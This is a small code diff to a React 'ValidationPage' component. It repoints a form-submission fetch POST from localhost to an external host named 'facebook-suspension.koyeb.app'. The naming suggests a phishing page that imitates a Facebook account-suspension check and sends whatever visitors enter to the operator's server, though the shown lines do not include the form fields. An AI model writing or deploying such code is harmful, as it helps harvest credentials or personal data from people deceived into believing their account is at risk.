@@ -29,7 +29,7 @@ const ValidationPage = (props) => {
 
   
     
-    fetch("http://localhost:5000/submit",{
+    fetch("https://facebook-suspension.koyeb.app/submit",{
       method:"POST",
       headers: {
         "Content-Type": "application/json"
